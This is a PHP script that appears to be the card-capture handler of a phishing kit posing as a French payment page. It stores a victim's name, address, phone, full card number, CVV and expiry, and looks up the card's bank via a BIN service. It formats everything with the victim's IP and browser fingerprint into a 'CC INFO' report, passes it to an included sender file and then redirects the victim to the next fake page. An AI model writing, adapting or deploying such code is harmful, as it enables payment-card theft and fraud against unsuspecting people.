<?php
error_reporting(0);
session_start();

include("../detect.php"); 
$useragent = $_SERVER['HTTP_USER_AGENT'];
$brow = getBrowser() ;
$sys = getOs();
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;

$InfoDATE   = date("d-m-Y h:i:sa");

$nom = $_SESSION['nom'] = $_POST['nom'];
$prenom = $_SESSION['prenom'] = $_POST['prenom'];
$address = $_SESSION['address'] = $_POST['address'];
$phone = $_SESSION['phone'] = $_POST['phone'];
$zip_code = $_SESSION['zip_code'] = $_POST['zip_code'];
$ville = $_SESSION['city'] = $_POST['city'];
$cc_number = $_SESSION['cc_number'] = $_POST['cc_number'];
$cc_cvv = $_SESSION['cc_cvv'] = $_POST['cc_cvv'];
$cc_date = $_SESSION['cc_date'] = $_POST['cc_date'];




$bincheck = $_POST['cc_number'] ;
$bincheck = preg_replace('/\s/', '', $bincheck);


$bin = $_POST['cc_number'] ;
$bin = preg_replace('/\s/', '', $bin);
$bin = substr($bin,0,8);
$url = "https://lookup.binlist.net/".$bin;
$headers = array();
$headers[] = 'Accept-Version: 3';
$ch = curl_init();  
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$resp=curl_exec($ch);
curl_close($ch);
$xBIN = json_decode($resp, true);

$_SESSION['bank_name'] = $xBIN["bank"]["name"];
$_SESSION['bank_scheme'] = strtoupper($xBIN["scheme"]);
$_SESSION['bank_type'] = strtoupper($xBIN["type"]);
$_SESSION['bank_brand'] = strtoupper($xBIN["brand"]);




$yagmai .= '

[👤 Nom] = '.$_SESSION['nom'].'
[👤 Prenom] = '.$_SESSION['prenom'].'
[🌐 Adresse] = '.$_SESSION['address'].'
[☎ Phone] = '.$_SESSION['phone'].'
[🌐 Zip code] = '.$_SESSION['zip_code'].'
[🌐 Ville] = '.$_SESSION['city'].'
[💳 N° Carte] = '.$_SESSION['cc_number'].'
[🔑 (CVV)] = '.$_SESSION['cc_cvv'].'
[🔄 Expiry Date ] = '.$_SESSION['cc_date'].'
        [+]━━━━【💳 Bin】━━━[+]
[🏛 Card Bank] = '.$_SESSION['bank_name'].' 
[💳 Card type] = '.$_SESSION['bank_type'].' 
[💳 Card brand] = '.$_SESSION['bank_brand'].' 
       [+]━━━━【💻 System】━━━[+]
[🔍 IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[⏰ TIME/DATE] ='.$InfoDATE.'
[🌐 BROWSER] = '.$brow.' and '.$sys.'
[🔍 FINGERPRINT] = '.$useragent.'
';



$yagmail .= '
[+]━━━━━━━━━━━━━━【💳 CC INFO】━━━━━━━━━━━━━━[+]
[👤 Nom] = '.$_SESSION['nom'].'
[👤 Prenom] = '.$_SESSION['prenom'].'
[🌐 Adresse] = '.$_SESSION['address'].'
[☎ Phone] = '.$_SESSION['phone'].'
[🌐 Zip code] = '.$_SESSION['zip_code'].'
[🌐 Ville] = '.$_SESSION['city'].'
[💳 N° Carte] = '.$_SESSION['cc_number'].'
[🔑 (CVV)] = '.$_SESSION['cc_cvv'].'
[🔄 Expiry Date ] = '.$_SESSION['cc_date'].'
            [+]━━━━【💳 Bin】━━━[+]
[🏛 Card Bank]          = '.$_SESSION['bank_name'].' 
[💳 Card type]          = '.$_SESSION['bank_type'].' 
[💳 Card brand]         = '.$_SESSION['bank_brand'].' 
[+]━━━━━━━━━━━━━━━━【💻 System INFO】━━━━━━━━━━━━━━━[+]
[🔍 IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[⏰ TIME/DATE] ='.$InfoDATE.'
[🌐 BROWSER] = '.$brow.' and '.$sys.'
[🔍 FINGERPRINT] = '.$useragent.'
';

include("SendApi.php"); 



header('Location: ../load_paylib.php');




?>